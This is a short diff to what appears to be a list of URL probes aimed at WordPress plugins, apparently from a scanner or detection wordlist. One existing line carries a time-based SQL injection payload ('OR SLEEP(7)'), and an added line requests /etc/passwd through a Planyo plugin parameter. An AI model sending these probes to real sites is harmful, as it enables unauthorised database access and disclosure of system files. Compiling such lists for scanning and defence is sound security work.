@@ -1099,3 +1099,7 @@
 /wp-content/plugins/woocommerce-wholesale-lead-capture/readme.txt
 /?to=2026-09-12&from=2026-08-13&mc-api=json
 /?to=2026-09-12&from=2026-08-13&mc-api=json&mc_auth=1%2C2)%20OR%20SLEEP%287%29--%20x
+/wp-content/plugins/profile-builder/readme.txt
+/register/
+/wp-content/plugins/planyo-online-reservation-system/readme.txt
+/wp-content/plugins/planyo-online-reservation-system/ulap.php?ulap_url=file://localhost/etc/passwd
